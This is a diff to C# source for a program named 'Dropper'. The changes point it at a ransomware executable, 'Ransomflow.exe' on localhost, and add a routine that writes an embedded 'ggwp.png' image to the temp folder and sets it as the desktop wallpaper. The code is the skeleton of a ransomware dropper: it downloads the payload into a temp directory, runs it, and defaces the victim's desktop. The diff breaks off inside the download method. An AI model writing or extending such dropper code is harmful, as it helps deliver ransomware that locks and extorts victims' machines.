@@ -1,4 +1,5 @@
 ﻿using System.Diagnostics;
+using System.Drawing;
 using System.IO;
 using System.Net;
 using System.Reflection;
@@ -10,14 +11,31 @@ namespace Dropper
     /// </summary>
     class Dropper
     {
-        private static string ransomFlowExecutableUrl = "http://ransomflow.exe"; // Change this
+        private static string ransomFlowExecutableUrl = "http://localhost/Ransomflow.exe";
+        private static string downloadPath = Path.Combine(Path.GetTempPath(), "ransomflow\\");
 
         /// <summary>
         /// Program entry point
         /// </summary>
         static void Main(string[] args)
         {
+            if (!Directory.Exists(downloadPath))
+            {
+                Directory.CreateDirectory(downloadPath);
+            }
+
             RunRansomflow();
+            SetBackground();
+        }
+
+        private static void SetBackground()
+        {
+            ImageConverter converter = new ImageConverter();
+            string backgroundPath = Path.Combine(downloadPath, "ggwp.png");
+
+            File.WriteAllBytes(backgroundPath, (byte[])converter.ConvertTo(Properties.Resources.ggwp, typeof(byte[])));
+
+            Wallpaper.Set(backgroundPath);
         }
 
         /// <summary>
@@ -25,13 +43,6 @@ namespace Dropper
         /// </summary>
         private static void RunRansomflow()
         {
-            string downloadPath = Path.Combine(Path.GetTempPath(), "ransomflow\\");
-
-            if(!Directory.Exists(downloadPath))
-            {
-                Directory.CreateDirectory(downloadPath);
-            }
-
             string filePath = Path.Combine(downloadPath, "Ramsonflow.exe");
 
             using (WebClient client = new WebClient())
